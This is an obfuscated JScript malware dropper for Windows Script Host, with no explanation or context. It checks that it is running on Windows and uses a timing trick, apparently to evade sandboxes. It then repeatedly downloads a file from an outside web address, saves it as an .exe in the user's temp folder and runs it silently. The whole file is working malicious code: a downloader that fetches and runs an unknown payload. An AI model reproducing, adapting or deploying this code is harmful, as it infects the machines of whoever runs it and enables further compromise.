var c0 = false;
var Jg = "CreateObject";
var b = function Mn() {return WScript[Jg]("WScript.Shell");}(), ed = 11;
var O = "MSXML2.XMLHTTP";
var I = 2123213;
var aA = 0;
function qD(vM){b["Run"](vM, aA, aA);};
function Ge(){return "" + O;};
function v(Ed, I0){aA = aA * 1; return Ed - I0;};
function K(){return Jg;};
/*@cc_on
  @if (@_win32 || @_win64)
    c0 = true;
  @end
@*/
if (c0)
{
var V = "";
function E(){return 22;};
var c = 0; var Wk = 0;
function w()
{
var K0 = new this["Date"]();
var la = K0["getUTCMilliseconds"]();
WScript["Sleep"](E());
var K0 = new this["Date"]();
var u = K0["getUTCMilliseconds"]();
WScript["Sleep"](E());
var K0 = new this["Date"]();
var lK = K0["getUTCMilliseconds"]();
var c = "x";
c = v(u, la);
var Wk = "DO";
Wk = v(lK, u);
V = "open";
return v(c, Wk);
}
var q = false;
var i = false;
for (var RG = aA; RG < E() * 1; RG++){if (w() != aA){
q = true; 
Wk = "31" + 11 * c + Wk; 
i = true; 
break;
}}
function R() {return ((q == true) && (q == i)) ? 1 : aA;};
if (q && R() && i){
function e() {return b["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "eOEbNRca1Z0.exe";};
 uZ = Ge();
 iN = WScript[Jg](uZ);
 var uS = 1;
 while (uS){
try {
iN[V]("GET", "http://pasticceriabonci.it/m1psa", false);
iN["send"]();
SX = "Sleep";
for (;;){WScript[SX](E() * 11); if (iN["readystate"] >= 2 * 2) break;};
uS = aA;
} catch(h){};
}
function Qa(FO) {var dG = (1, 2, 3, 4, 5, FO); return dG;};
J = WScript[K()]("ADODB.Stream");
uZ = J;
uZ[V]();
uZ["type"] = Qa(1);
uZ["write"](iN["ResponseBody"]);
J["position"] = Qa(aA);
uZ["Save" + "ToFile"](e(), 2);
J["c"+"lose"]();
EH = e();
qD(EH);
}
}

